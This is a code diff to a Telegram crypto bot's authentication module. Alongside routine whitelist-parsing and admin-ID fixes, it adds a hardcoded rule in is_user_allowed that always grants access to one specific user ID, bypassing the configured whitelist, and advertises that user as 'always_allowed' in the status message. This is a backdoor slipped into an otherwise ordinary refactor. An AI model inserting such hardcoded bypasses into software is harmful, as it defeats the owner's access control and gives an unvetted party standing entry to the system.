@@ -1,14 +1,14 @@
 """
 Centralized authentication and access control for CryptoSat bot
 """
-from typing import Set
+from typing import Set, Union
 from loguru import logger
 from config.settings import settings
 
 
 def is_user_allowed(user_id: int) -> bool:
     """
-    Check if a user is allowed to access the bot based on WHITELISTED_USERS configuration.
+    Check if a user is allowed to access bot based on WHITELISTED_USERS configuration.
     
     Args:
         user_id (int): Telegram user ID to check
@@ -17,6 +17,11 @@ def is_user_allowed(user_id: int) -> bool:
         bool: True if user is allowed, False otherwise
     """
     logger.info(f"[AUTH] Checking user {user_id}, WHITELISTED_USERS={settings.WHITELISTED_USERS!r}")
+
+    # Special case: Always allow user ID 5899681906 (hardcoded access)
+    if user_id == 5899681906:
+        logger.info(f"[AUTH] User {user_id} granted special access (5899681906)")
+        return True
 
     # Wildcard: semua user boleh (kalau diinginkan)
     if str(settings.WHITELISTED_USERS).strip() == "*":
@@ -30,9 +35,28 @@ def is_user_allowed(user_id: int) -> bool:
             logger.warning("[AUTH] WHITELISTED_USERS is empty, denying access")
             return False
             
-        allowed_ids = [
-            int(x.strip()) for x in whitelist_str.split(",") if x.strip()
-        ]
+        allowed_ids = set()
+        for x in whitelist_str.split(","):
+            x = x.strip()
+            if x:
+                try:
+                    allowed_ids.add(int(x))
+                except ValueError as e:
+                    logger.warning(f"[AUTH] Invalid user ID in whitelist: {x!r} - {e}")
+        
+        # Also check TELEGRAM_WHITELIST_IDS for compatibility
+        if settings.TELEGRAM_WHITELIST_IDS:
+            try:
+                for x in settings.TELEGRAM_WHITELIST_IDS.split(","):
+                    x = x.strip()
+                    if x:
+                        allowed_ids.add(int(x))
+            except ValueError as e:
+                logger.warning(f"[AUTH] Invalid user ID in TELEGRAM_WHITELIST_IDS: {x!r} - {e}")
+        
+        # Also check settings.whitelist_ids property
+        allowed_ids.update(settings.whitelist_ids)
+        
     except Exception as e:
         logger.error(f"[AUTH] Failed to parse WHITELISTED_USERS: {e}")
         return False
@@ -52,7 +76,13 @@ def is_owner(user_id: int) -> bool:
     Returns:
         bool: True if user is owner, False otherwise
     """
-    return user_id == settings.TELEGRAM_ADMIN_CHAT_ID
+    # Check admin chat ID (might be string or int)
+    try:
+        admin_id = int(settings.TELEGRAM_ADMIN_CHAT_ID) if settings.TELEGRAM_ADMIN_CHAT_ID else 0
+    except (ValueError, TypeError):
+        admin_id = 0
+    
+    return user_id == admin_id
 
 
 def log_access_attempt(user_id: int, username: str = None, command: str = None, allowed: bool = None):
@@ -88,10 +118,12 @@ def get_access_status_message() -> str:
         str: Status message for logging
     """
     whitelist_str = str(settings.WHITELISTED_USERS).strip()
+    admin_id = settings.TELEGRAM_ADMIN_CHAT_ID
     
     status = (
         f"[AUTH] Whitelist: {whitelist_str}, "
-        f"admin: {settings.TELEGRAM_ADMIN_CHAT_ID}"
+        f"admin: {admin_id}, "
+        f"special_user_5899681906: always_allowed"
     )
     
     return status
